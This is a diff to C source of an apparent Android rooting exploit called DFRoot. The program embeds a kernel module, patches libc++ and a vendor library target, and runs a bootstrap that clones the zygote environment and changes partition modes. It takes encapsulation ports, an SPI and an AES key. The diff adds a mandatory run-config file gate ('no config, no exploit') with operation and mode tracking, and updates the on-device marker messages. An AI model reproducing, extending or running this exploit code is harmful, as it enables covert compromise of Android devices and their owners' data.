@@ -1,4 +1,6 @@
 /* Modified 2026-11-17 (DFRoot GZIF): .incbin reduced to dfroot-android13-5.15.ko; KO_TARGET_CANDIDATES reduced to /vendor/lib64/AIAwbModel_v2.2.tflite. See NOTICE. */
+/* Modified 2026-11-25 (DFRoot GZIF): require a strict run-config artifact before any patch work. See NOTICE. */
+/* Modified 2026-11-25 (DFRoot GZIF): update native marker wording from preferences to run-config. See NOTICE. */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -17,6 +19,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
+#include "run_config_codec.h"
 
 #define eos(s) (s + strlen(s))
 
@@ -28,6 +31,13 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+
+/* Admitted snapshot identity retained for the Phase 4B terminal protocol. */
+static char             g_operation_id[RUN_CONFIG_OPERATION_ID_MAX + 1];
+static uint64_t         g_generation;
+static char             g_manager[RUN_CONFIG_MANAGER_MAX];
+static run_config_mode_t g_mode;
+
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -453,48 +463,42 @@ static const char *detect_ko_target(void) {
     return candidates[0];
 }
 
-static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
-    if (strlen(hex) != len * 2) return -1;
-    for (size_t i = 0; i < len; i++) {
-        unsigned int b;
-        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
-        out[i] = (uint8_t)b;
-    }
-    return 0;
-}
-
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port PORT --sender-port PORT --spi SPI "
+            "--aes-key HEX64 --run-config PATH\n", argv0);
+}
+
+static const char *mode_name(run_config_mode_t mode) {
+    return mode == RUN_CONFIG_MODE_UNATTENDED_BOOT ? "unattended_boot" : "manual";
 }
 
 static int setup(int argc, char **argv) {
-    int encap_port = 0, sender_port = 0;
-    uint32_t spi = 0;
-    uint8_t aes_key[32];
-    int have_aes = 0;
-
-    for (int i = 1; i < argc; i++) {
-        const char *a = argv[i];
-        if (!strcmp(a, "--encap-port") && i + 1 < argc)
-            encap_port = atoi(argv[++i]);
-        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
-            sender_port = atoi(argv[++i]);
-        else if (!strcmp(a, "--spi") && i + 1 < argc)
-            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
-        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
-            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
-        else { usage(argv[0]); return 2; }
-    }
-    if (!encap_port || !sender_port || !spi || !have_aes) {
-        usage(argv[0]); return 2;
+    struct run_config_native_args args;
+    if (run_config_parse_native_args(argc, argv, &args) != 0) {
+        fprintf(stderr, "invalid native arguments: %s\n", run_config_last_error());
+        usage(argv[0]);
+        return 2;
     }
 
-    g_encap_port  = encap_port;
-    g_sender_port = sender_port;
-    g_spi         = spi;
+    /* Fail closed before any patch work: no config, no exploit. */
+    struct run_config config;
+    if (run_config_parse_file(args.run_config_path, &config) != 0) {
+        fprintf(stderr, "run-config rejected: %s\n", run_config_last_error());
+        return 2;
+    }
+
+    /* Admitted snapshot identity is retained for the Phase 4B terminal protocol. */
+    memcpy(g_operation_id, config.operation_id, sizeof(g_operation_id));
+    g_generation = config.generation;
+    memcpy(g_manager, config.manager, sizeof(g_manager));
+    g_mode = config.mode;
+
+    g_encap_port  = args.encap_port;
+    g_sender_port = args.sender_port;
+    g_spi         = args.spi;
     g_seq         = 1;
-    memcpy(g_aes_key, aes_key, 32);
+    memcpy(g_aes_key, args.aes_key, sizeof(g_aes_key));
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
@@ -503,8 +507,10 @@ static int setup(int argc, char **argv) {
 
     printf("=== setup ===\n");
     printf("found ko_target: %s\n", ko_target);
-    printf("encap port: %d\n", encap_port);
-    printf("spi: 0x%x\n", spi);
+    printf("encap port: %d\n", (int)args.encap_port);
+    printf("spi: 0x%x\n", args.spi);
+    printf("run-config: operation=%s generation=%llu manager=%s mode=%s\n",
+           g_operation_id, (unsigned long long)g_generation, g_manager, mode_name(g_mode));
     return 0;
 }
 
@@ -540,8 +546,8 @@ static int exploit(void) {
     } markers[] = {
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
-        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
-        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
+        { "/dev/dfm1",  "bootstrap: loading run-config artifact",            -1 },
+        { "/dev/dfme0", "bootstrap: ERROR - reading run-config failed",       1 },
         { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
         { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
         { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
